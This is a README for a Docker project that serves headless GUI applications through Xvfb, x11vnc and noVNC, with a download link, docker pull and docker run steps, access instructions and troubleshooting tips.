# 🎈 vnc-containers - Access GUI Applications Effortlessly

[![Download vnc-containers](https://img.shields.io/badge/Download-vnc--containers-brightgreen.svg)](https://github.com/MuhamadRezkaAlAnshori/vnc-containers/releases)

## 📦 Overview

vnc-containers provides Docker containers featuring Xvfb, x11vnc, and noVNC. This setup allows you to easily access graphical user interface (GUI) applications in environments without screens. You can run applications in a headless manner and access them via your web browser or VNC client.

## 🚀 Getting Started

To get started, you need to download the software and run it on your computer or server. Follow the steps below to accomplish this.

## 💻 System Requirements

- **Operating System**: Ubuntu or other Linux distributions.
- **Docker**: Ensure you have Docker installed. You can download it from [Docker's official website](https://www.docker.com/products/docker-desktop).
- **Internet Connection**: Required to download the Docker images and further dependencies.

## 💾 Download & Install

Visit the page to download the latest release of vnc-containers:

[Download vnc-containers](https://github.com/MuhamadRezkaAlAnshori/vnc-containers/releases)

On the releases page, you will find the latest version of the software. Look for an asset that interests you and click on it to initiate the download. 

## 🔧 How to Run

Once downloaded, follow these steps to run the application:

1. **Open your terminal**: Access the terminal on your Linux machine.
  
2. **Navigate to the download location**: Use the `cd` command to change to the directory where you downloaded the Docker file.

   ```bash
   cd path/to/download/directory
   ```

3. **Start Docker**: If Docker is not currently running, you can start it using your system's application manager or by running the following command:

   ```bash
   sudo systemctl start docker
   ```

4. **Pull the Docker image**: Use the command below to pull the latest vnc-containers image. This command downloads the necessary files to your local machine.

   ```bash
   docker pull muhamadrezkaalan/vnc-containers
   ```

5. **Run the container**: Once the image is fully downloaded, run it with the following command:

   ```bash
   docker run -d -p 8080:80 muhamadrezkaalan/vnc-containers
   ```

   This command runs the container in detached mode and maps your local port 8080 to the container's port 80.

6. **Access your application**: Open your web browser and navigate to `http://localhost:8080`. You should be greeted with the interface that allows you to interact with your GUI application.

## 🌐 Accessing Applications

You can use either a web browser or a VNC client to access your GUI applications.

- **For Web Browser**: Open a browser and type `http://localhost:8080` in the address bar.

- **For VNC Client**: Open your preferred VNC client and connect to `localhost:5900` (or the relevant port specified).

## 🔍 Features

- **Easy Access**: Run GUI applications without needing a physical screen.
- **Browser Interface**: Access applications directly from your web browser via noVNC.
- **Multi-Application Support**: Run different applications in separate containers.
- **Lightweight**: Uses Docker for efficient resource management.

## ❓ Troubleshooting

If you encounter issues, try the following common solutions:

- **Docker Not Starting**: Ensure Docker is installed properly and started. You can check its status with:

   ```bash
   sudo systemctl status docker
   ```

- **Port Conflicts**: If port 8080 or 5900 is occupied, change the port in the commands above to another open port.

- **Slow Performance**: Ensure your machine meets system requirements and check if other applications are consuming resources.

## 📜 License

This project is licensed under the MIT License. You can find the full license text in the repository.

## 📫 Contact

For questions or assistance, please open an issue in the repository. We will try to respond as quickly as possible.

Thank you for choosing vnc-containers! We hope it helps you run your GUI applications smoothly. Enjoy your experience!